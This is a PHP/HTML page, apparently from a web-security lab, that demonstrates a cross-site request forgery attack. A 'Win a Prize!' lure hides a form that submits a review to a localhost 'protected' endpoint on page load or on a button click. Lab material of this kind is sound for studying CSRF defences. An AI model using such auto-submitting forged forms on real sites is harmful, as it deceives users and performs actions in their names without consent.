<?php
// This is a malicious form that will attempt to submit a review without user consent
?>
<!DOCTYPE html>
<html>

<head>
    <title>Win a Prize!</title>
</head>

<body>
    <h1>Click here to win a prize!</h1>

    <!-- Hidden malicious form that automatically submits -->
    <form id="maliciousForm" action="http://localhost/lab1/src/submit_review_protected.php" method="POST" style="display:none;">
        <input type="text" name="review" value="Malicious review posted via CSRF!">
    </form>

    <button onclick="document.getElementById('maliciousForm').submit();">Claim Your Prize!</button>

    <script>
        // Automatically submit the form when the page loads
        window.onload = function() {
            document.getElementById('maliciousForm').submit();
        }
    </script>
</body>

</html>